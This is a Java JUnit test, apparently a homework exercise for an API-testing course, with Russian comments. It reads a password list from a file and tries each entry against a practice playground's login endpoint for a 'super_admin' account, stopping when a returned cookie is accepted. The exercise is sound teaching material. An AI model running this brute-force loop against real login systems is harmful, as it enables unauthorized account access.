import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

public class Ex9Test {

    @Test
    public void testPodborPassword() {
        String login = "super_admin";
        String path = "src/test/resources/pass.txt";
        File file = new File(path);
        String absolutePath = file.getAbsolutePath();

        try (BufferedReader reader = new BufferedReader(new FileReader(absolutePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                // Извлекаем пароли, разделенные запятыми
                String[] passwords = line.split(",");

                for (String password : passwords) {
                    password = password.trim(); // Убираем лишние пробелы

                    // Выполняем POST-запрос для получения cookie
                    Response response = RestAssured
                            .given()
                            .formParam("login", login)
                            .formParam("password", password)
                            .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework");

                    // Получаем cookie из ответа
                    String authCookie = response.getCookie("auth_cookie");

                    // Если мы получили auth_cookie, проверяем ее корректность
                    if (authCookie != null) {
                        Response checkResponse = RestAssured
                                .given()
                                .cookie("auth_cookie", authCookie)
                                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie");

                        // Проверяем ответ на корректность
                        if (checkResponse.body().asString().equals("You are authorized")) {
                            checkResponse.print();
                            return;  // Выходим из метода при успешной авторизации
                        }
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}